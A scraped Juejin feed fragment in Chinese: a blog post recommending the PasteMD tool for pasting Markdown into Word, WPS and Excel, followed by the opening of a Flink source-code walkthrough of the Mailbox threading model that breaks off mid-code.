itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            复制即所得:PasteMD让Markdown粘贴Office不再有格式烦恼
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2641475936724142/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    修己xj
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T13:14:29.000Z" title="Thu Jan 15 2026 13:14:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>前不久我们项目验收，领导要求我整理一份代码结构及功能说明的Word文档。我借助 Cursor 只用了五分钟就生成好了内容，但在转换格式时却遇到了难题——尝试了好几个在线 Markdown 转 Word 的工具，导出的文档格式总是不尽如人意。</p>
<p>最近逛 GitHub 时，我偶然发现了一个叫 PasteMD 的开源项目。它是一款常驻系统托盘的小工具，能直接从剪贴板读取 Markdown 内容，通过 Pandoc 引擎转换为规范的 DOCX 格式，并自动插入到 Word 或 WPS 文档的光标位置，真正实现了“复制即粘贴，所见即所得”。</p>
<p>不知道你在写论文、做报告或者整理文档时，是否也曾为这些事头疼过：</p>
<p>从 ChatGPT、DeepSeek 等 AI 工具里复制出来的内容，一粘贴到 Word 里格式就全乱；</p>
<p>Markdown 表格怎么都粘贴不进 Excel，总是错位或丢失样式；</p>
<p>好好的数学公式，到了 Word 里却变成了一堆难以理解的 LaTeX 代码……</p>
<p>如果你也遇到过这些问题，那么 PasteMD 或许正是你一直在找的解决方案。</p>
<p><img src="" alt="" loading="lazy"/></p>
<h2 data-id="heading-0">📚什么是PasteMD？</h2>
<p>PasteMD是一个常驻系统托盘的小工具，它做了一件看似简单却极其实用的事情：<strong>从剪贴板读取Markdown或网页内容，智能转换为Office文档格式，并自动插入到Word/WPS或Excel中</strong>。</p>
<p>该项目目前github上的star⭐️情况 <img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/48cebb1f38f24020b58c5c6bf276a108~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769087668&amp;x-signature=owSZ9G6gBS0yoexqMjFWd0m%2FMRY%3D" alt="" loading="lazy"/></p>
<p>github地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FRICHQAQ%2FPasteMD" target="_blank" title="https://github.com/RICHQAQ/PasteMD" ref="nofollow noopener noreferrer">github.com/RICHQAQ/Pas…</a></p>
<p>文档地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fpastemd.richqaq.cn%2F" target="_blank" title="https://pastemd.richqaq.cn/" ref="nofollow noopener noreferrer">pastemd.richqaq.cn/</a></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/90fd27ce8fd64089ab046afe165cb6c8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769087668&amp;x-signature=If0uliGOdku%2Bzn1TgCIlXF7ymmQ%3D" alt="" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2b209fdb5da54f6484ffbdc42014c7e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769087668&amp;x-signature=Z14kvVPnRwkZP6onlzKg6rRHcOU%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-1">🦆为什么你需要PasteMD？</h2>
<h3 data-id="heading-2">1. AI对话内容一键规范化</h3>
<p>现在大多数人尤其是客户都会在工作中用AI辅助写文档，但AI生成的Markdown内容直接粘贴到Word中效果很差。PasteMD通过强大的Pandoc引擎，将Markdown完美转换为DOCX格式，保持所有格式、样式甚至数学公式的完整性。</p>
<h3 data-id="heading-3">2. 解决核心md文档粘贴痛点</h3>
<p>当你从 AI 网站复制带有 Markdown 格式的内容时，直接粘贴到 Word 会遇到：</p>
<ul>
<li>数学公式乱码：<img src="" alt="" loading="lazy"/> 变成普通文本，复杂公式完全不可读</li>
<li>格式丢失：粗体、斜体、代码块等格式全部消失</li>
<li>表格混乱：Markdown 表格粘贴后需要手动调整</li>
<li>代码显示问题：代码块没有语法高亮，显示混乱</li>
</ul>
<p><strong>PasteMD 的解决方案</strong></p>
<ol>
<li>一键转换：按下热键（默认 Ctrl+Shift+B），自动完成转换和插入</li>
<li>智能识别：自动判断剪贴板内容类型和当前应用</li>
<li>格式完美：数学公式、代码块、表格等完美呈现</li>
<li>无缝集成：内容直接插入到光标位置，无需手动操作</li>
</ol>
<h3 data-id="heading-4">3. 全面兼容主流AI平台</h3>











































































<table><thead><tr><th>AI 网站</th><th>复制 Markdown （无公式）</th><th>复制 Markdown （含公式）</th><th>复制网页内容 （无公式）</th><th>复制网页内容 （含公式）</th></tr></thead><tbody><tr><td><strong>Kimi</strong></td><td>✅ 完美支持</td><td>✅ 完美支持</td><td>✅ 完美支持</td><td>⚠️ 无法显示公式</td></tr><tr><td><strong>DeepSeek</strong></td><td>✅ 完美支持</td><td>✅ 完美支持</td><td>✅ 完美支持</td><td>✅ 完美支持</td></tr><tr><td><strong>通义千问</strong></td><td>✅ 完美支持</td><td>✅ 完美支持</td><td>✅ 完美支持</td><td>⚠️ 无法显示公式</td></tr><tr><td><strong>豆包</strong>*</td><td>✅ 完美支持</td><td>✅ 完美支持</td><td>✅ 完美支持</td><td>✅ 完美支持</td></tr><tr><td><strong>智谱清言 /ChatGLM</strong></td><td>✅ 完美支持</td><td>✅ 完美支持</td><td>✅ 完美支持</td><td>✅ 完美支持</td></tr><tr><td><strong>ChatGPT</strong></td><td>✅ 完美支持</td><td>⚠️ 公式显示为代码</td><td>✅ 完美支持</td><td>✅ 完美支持</td></tr><tr><td><strong>Gemini</strong></td><td>✅ 完美支持</td><td>✅ 完美支持</td><td>✅ 完美支持</td><td>✅ 完美支持</td></tr><tr><td><strong>Grok</strong></td><td>✅ 完美支持</td><td>✅ 完美支持</td><td>✅ 完美支持</td><td>✅ 完美支持</td></tr><tr><td><strong>Claude</strong></td><td>✅ 完美支持</td><td>✅ 完美支持</td><td>✅ 完美支持</td><td>✅ 完美支持</td></tr></tbody></table>
<h2 data-id="heading-5">🚀使用方法</h2>
<ol>
<li>下载可执行文件（<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FRICHQAQ%2FPasteMD%2Freleases%2F" target="_blank" title="https://github.com/RICHQAQ/PasteMD/releases/" ref="nofollow noopener noreferrer">Releases 页面：https://github.com/RICHQAQ/PasteMD/releases/</a>），之后点击安装即可。</li>
</ol>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8a16f027cbff4139b2446c587ca78bb8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769087668&amp;x-signature=XfjkTmokAtcItTn2A1PEWn5T0tQ%3D" alt="" loading="lazy"/></p>
<ol start="2">
<li>
<p>打开 Word、WPS 或 Excel，光标放在需要插入的位置。</p>
</li>
<li>
<p>复制 <strong>Markdown</strong> 或者 <strong>网页内容</strong> 到剪贴板，按下热键 <strong>Ctrl+Shift+B</strong>。</p>
</li>
<li>
<p>转换结果会自动插入到文档中：</p>
<ul>
<li><strong>Markdown 表格</strong> → 自动粘贴到 Excel（如果 Excel 已打开）</li>
<li><strong>普通 Markdown</strong>/<strong>网页内容</strong> → 转换为 DOCX 并插入 Word/WPS</li>
</ul>
</li>
<li>
<p>右下角会提示成功/失败。</p>
</li>
</ol>
<ul>
<li>md转word</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8aa1162559ea4e0e86164c39eec3d3e4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769087668&amp;x-signature=pvf27vBuNxowzH3VaRdiEtPhP0c%3D" alt="" loading="lazy"/></p>
<ul>
<li>md转execl</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9f5efaa03730408589b262ea941117c5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769087668&amp;x-signature=TMVsrltj87GpFFmsdS%2BasmuuMvM%3D" alt="pastemd-execl.png" loading="lazy"/></p>
<p>pastemd-execl.png</p>
<ul>
<li>html转word</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/037e3942ee664d5f97a30483dafac4a8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5L-u5bexeGo=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769087668&amp;x-signature=vUE3HZcKK5oXS2f1kZnql5XLGVA%3D" alt="pastemd-html.png" loading="lazy"/></p>
<p>pastemd-html.png</p>
<h2 data-id="heading-6">🌟 核心功能亮点</h2>
<h3 data-id="heading-7">🎯 智能内容识别</h3>
<p>自动识别剪贴板内容类型：</p>
<ul>
<li>Markdown 文本：标准 Markdown 语法</li>
<li>HTML 富文本：从网页复制的内容</li>
<li>Markdown 表格：自动识别并转换为 Excel</li>
<li>.md 文件：从文件管理器复制的文件</li>
</ul>
<h3 data-id="heading-8">📐 数学公式完美支持</h3>
<ul>
<li>支持行内公式：<code>$...$</code></li>
<li>支持块级公式：<code>$$...$$</code></li>
<li>自动修复常见 <code>LaTeX</code> 语法问题</li>
<li>兼容主流 AI 网站的公式格式</li>
</ul>
<h3 data-id="heading-9">📊 表格格式保留</h3>
<p>Excel 粘贴时完整保留：</p>
<ul>
<li>粗体：<strong>text</strong></li>
<li>斜体：<em>text</em></li>
<li>删除线：<del>text</del></li>
<li>行内代码：<code>code</code></li>
<li>代码块：<code>code</code></li>
<li>超链接：<a href="https://link.juejin.cn?target=url" target="_blank" title="url" ref="nofollow noopener noreferrer">text</a></li>
</ul>
<h3 data-id="heading-10">🎨 高度可定制</h3>
<ul>
<li>自定义全局热键</li>
<li>自定义样式模板（reference DOCX）</li>
<li>自定义 Pandoc 过滤器</li>
<li>自定义保存目录和文件保留策略</li>
<li>多语言支持（中文/英文）</li>
</ul>
<h3 data-id="heading-11">🔄 智能兜底模式</h3>
<p>当没有检测到目标应用时，可以：</p>
<ul>
<li>自动打开：自动启动 Word 并插入内容</li>
<li>仅保存：保存为文件到指定目录</li>
<li>复制到剪贴板：转换为富文本复制到剪贴板</li>
<li>无操作：仅显示通知</li>
</ul>
<h2 data-id="heading-12">🌿 结语</h2>
<p>在AI辅助成为常态的今天，PasteMD填补了从AI对话到正式文档之间的最后一道鸿沟。它不仅仅是一个格式转换工具，更是提升工作效率的智能助手。</p>
<p>无论你是学生写论文，还是职场人士准备报告，PasteMD都能让你的写作流程更加顺畅。告别繁琐的格式调整，专注于内容创作本身。</p>
<p>本文使用 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmdnice.com%2F%3Ffrom%3Djuejin" target="_blank" title="https://mdnice.com/?from=juejin" ref="nofollow noopener noreferrer">mdnice</a> 排版</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Flink源码阅读：Mailbox线程模型]]></title>    <link>https://juejin.cn/post/7595423767721115657</link>    <guid>https://juejin.cn/post/7595423767721115657</guid>    <pubDate>2026-01-15T13:28:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7595423767721115657" data-draft-id="7595423767721099273" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Flink源码阅读：Mailbox线程模型"/> <meta itemprop="keywords" content="Flink,大数据"/> <meta itemprop="datePublished" content="2026-01-15T13:28:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="面向Google编程"/> <meta itemprop="url" content="https://juejin.cn/user/1063982986695374"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Flink源码阅读：Mailbox线程模型
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1063982986695374/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    面向Google编程
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-15T13:28:25.000Z" title="Thu Jan 15 2026 13:28:25 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-15
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>本文我们来梳理 Flink 的线程模型——Mailbox。</p>
<h3 data-id="heading-0">写在前面</h3>
<p>在以前的线程模型中，Flink 通过 checkpointLock 来隔离保证不同线程在修改内部状态时的正确性。通过 checkpointLock 控制并发会在代码中出现大量的 <code>synchronize(lock)</code> 这样非常不利于阅读和调试。Flink 也提供了一些 API 将锁对象暴露给用户，如果没有正确使用锁，很容易导致线程安全问题。</p>
<p>为了解决这些问题，Flink 社区提出了基于 Mailbox 的线程模型。它是通过单线程加阻塞队列来实现。这样内部状态的修改就由单线程来完成了。</p>
<p>旧的线程模型中，checkpointLock 主要用在三个地方：</p>
<ul>
<li>Event Process：包括 event、watermark、barrier 的处理和发送</li>
<li>Checkpoint：包括 Checkpoint 的触发和完成通知</li>
<li>ProcessTime Timer：ProcessTime 的回调通常涉及对状态的修改</li>
</ul>
<p>在 Mailbox 模型中，将所有需要处理的事件都封装成 Mail 投递到 Mailbox 中，然后由单线程按照顺序处理。</p>
<h3 data-id="heading-1">相关定义</h3>
<p>下面我们来看 Mailbox 的具体实现，具体涉及到以下这些类。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9930735233954a9ca6f4521a08422be7~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2i5ZCRR29vZ2xl57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769088505&amp;x-signature=WNLTdN0%2BeAj34Ex%2Beju9J8jh6Ho%3D" alt="Mailbox" loading="lazy"/></p>
<p>我们来逐个看一下这些类的定义和作用。</p>
<h4 data-id="heading-2">Mail</h4>
<p>在 Mailbox 线程模型中，Mail 是最基础的一个类，它用来封装需要处理的消息和执行的动作。Checkpoint Trigger 和 ProcessTime Trigger 都是通过 Mail 来触发的。Mail 中包含以下属性：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-comment">// 选项，包括两个选项：isUrgent 和 deferrable</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> MailOptionsImpl mailOptions;

<span class="hljs-comment">// 要执行的动作</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ThrowingRunnable<span class="hljs-meta">&lt;?</span> <span class="hljs-keyword">extends</span> <span class="hljs-built_in">Exception</span>&gt; runnable;

<span class="hljs-comment">// 优先级，这里的优先级不决定执行顺序，而是避免上下游之间的死锁问题</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">int</span> priority;

<span class="hljs-comment">// 描述信息</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> String descriptionFormat;

<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Object[] descriptionArgs;

<span class="hljs-comment">// 用于执行 runnable 的执行器</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> StreamTaskActionExecutor actionExecutor;
</code></pre>
<h3 data-id="heading-3">TaskMailbox</h3>
<p>有了 Mail 之后，Flink 用 TaskMailbox 来存储它，在需要执行时，再从 TaskMailbox 中取出。具体的处理逻辑在 TaskMailboxImpl 中。</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// 内部对于 queue 和 state 的并发访问都需要被这个锁保护</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">ReentrantLock</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReentrantLock</span>();

<span class="hljs-comment">// 实际存储 Mail 的队列</span>
<span class="hljs-meta">@GuardedBy("lock")</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Deque&lt;Mail&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayDeque</span>&lt;&gt;();

<span class="hljs-comment">// 与 lock 关联的 Condition，主要用于队列从空变为非空时唤醒等待获取 Mail 的线程</span>
<span class="hljs-meta">@GuardedBy("lock")</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Condition</span> <span class="hljs-variable">notEmpty</span> <span class="hljs-operator">=</span> lock.newCondition();

<span class="hljs-comment">// 状态，包括 OPEN/QUIESCED/CLOSED</span>
<span class="hljs-meta">@GuardedBy("lock")</span>
<span class="hljs-keyword">private</span> <span class="hljs-type">State</span> <span class="hljs-variable">state</span> <span class="hljs-operator">=</span> OPEN;

<span class="hljs-comment">// 指定的邮箱线程的引用</span>
<span class="hljs-meta">@Nonnull</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Thread taskMailboxThread;

<span class="hljs-comment">// 用于性能优化的设计</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> Deque&lt;Mail&gt; batch = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayDeque</span>&lt;&gt;();

<span class="hljs-comment">// queue队列是否为空，用于性能优化，避免频繁访问主队列</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">volatile</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">hasNewMail</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;

<span class="hljs-comment">// 是否有紧急邮件，同样用于性能优化，减少检查队列中是否有紧急邮件的次数</span>
